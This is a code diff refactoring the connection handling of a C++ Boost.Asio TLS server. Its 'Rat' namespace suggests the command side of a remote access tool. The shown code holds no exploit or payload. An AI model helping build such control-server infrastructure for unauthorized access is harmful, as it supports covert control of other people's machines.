@@ -38,9 +38,8 @@ namespace Rat
     }
 
     Server::Server(uint16_t port)
-        : acceptor_(io_context_, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), port)),
-        networkManager_(),
-        security_(networkManager_) 
+        : networkManager_(), acceptor_(networkManager_.get_io_context(), boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), port))
+        
     {
         networkManager_.setup_ssl_context(true, "./server.crt", "./server.key", "./ca.crt");
     }
@@ -55,12 +54,12 @@ namespace Rat
         initListClientID();
         acceptConnections();
         input_thread_ = std::thread(&Server::handleUserInput, this);
-        io_context_.run();
+        networkManager_.get_io_context().run();
     }
 
     void Server::stop() 
     {
-        io_context_.stop();
+        networkManager_.get_io_context().stop();
         {
             std::lock_guard<std::mutex> lock(client_mutex_);
             clients_.clear();
@@ -97,49 +96,33 @@ namespace Rat
 
     void Server::acceptConnections() 
     {
-        auto tcp_socket = std::make_shared<boost::asio::ip::tcp::socket>(io_context_);
-        acceptor_.async_accept(*tcp_socket,
-            [this, tcp_socket](const boost::system::error_code& ec) 
-            {
-                if (!ec) 
-                {
-                    security_.authenticate(tcp_socket, "./ca.crt", "./ca.key",
-                        [this, tcp_socket](bool success, const boost::system::error_code& ec) 
-                        {
-                            if (!success) 
-                            {
-                                std::cout << "Server authentication failed: " << ec.message() << "\n";
-                                tcp_socket->close();
-                                boost::asio::post(io_context_, [this]() { acceptConnections(); });
-                                return;
+        auto socket = std::make_shared<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>>(
+            networkManager_.get_io_context(), networkManager_.get_ssl_context());
+
+        acceptor_.async_accept(socket->lowest_layer(),
+            [this, socket](const boost::system::error_code& ec) {
+                if (!ec) {
+                    socket->set_verify_mode(boost::asio::ssl::verify_peer);
+                    socket->async_handshake(boost::asio::ssl::stream_base::server,
+                        [this, socket](const boost::system::error_code& ec) {
+                            if (!ec) {
+                                std::cout << "New client connected: " << socket->lowest_layer().remote_endpoint().address().to_string() << "\n";
+                                handleClient(socket);
+                            } else {
+                                std::cout << "Handshake error: " << ec.message() << "\n";
                             }
-                            auto ssl_socket = security_.createSslSocket(tcp_socket, networkManager_.get_ssl_context());
-                            ssl_socket->async_handshake(boost::asio::ssl::stream_base::server,
-                                [this, ssl_socket](const boost::system::error_code& ec) {
-                                    if (!ec) 
-                                    {
-                                        std::string client_id = std::to_string(ssl_socket->lowest_layer().native_handle());
-                                        std::cout << "New client connected: " << ssl_socket->lowest_layer().remote_endpoint().address().to_string() + "_" + md5HashString(client_id) << "\n";
-                                        addClient(ssl_socket);
-                                        handleClient(ssl_socket);
-                                    } 
-                                    else 
-                                    {
-                                        std::cout << "Handshake error: " << ec.message() << "\n";
-                                        ssl_socket->lowest_layer().close();
-                                    }
-                                    boost::asio::post(io_context_, [this]() { acceptConnections(); });
-                                });
+                            boost::asio::post(networkManager_.get_io_context(), [this]() { acceptConnections(); });
+                            // acceptConnections();
                         });
-                } 
-                else 
-                {
+                } else {
                     std::cout << "Accept error: " << ec.message() << "\n";
-                    boost::asio::post(io_context_, [this]() { acceptConnections(); });
+                    boost::asio::post(networkManager_.get_io_context(), [this]() { acceptConnections(); });
+                    // acceptConnections();
                 }
             });
     }
 
+    
     void Server::handleClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client) {
         networkManager_.receive(client,
             [this, client](const rat::Packet& packet, const boost::system::error_code& ec) 
@@ -180,7 +163,7 @@ namespace Rat
                     std::cout << "Client (" << client->lowest_layer().remote_endpoint().address().to_string() + "_" + std::to_string(clients_[client]) << "): "
                             << packet.chunked_data().payload() << "\n";
                 }
-                boost::asio::post(io_context_, [this, client]() { handleClient(client); });
+                boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); });
             });
     }
 
@@ -321,7 +304,7 @@ namespace Rat
 
     void Server::saveClientIdsToFile(const uint64_t& source_id, const std::string& path) 
     {
-        boost::asio::post(io_context_, [this, source_id, path]() 
+        boost::asio::post(networkManager_.get_io_context(), [this, source_id, path]() 
         {
             std::lock_guard<std::mutex> lock(file_save_mutex_);
             std::ofstream file(path, std::ios::app);
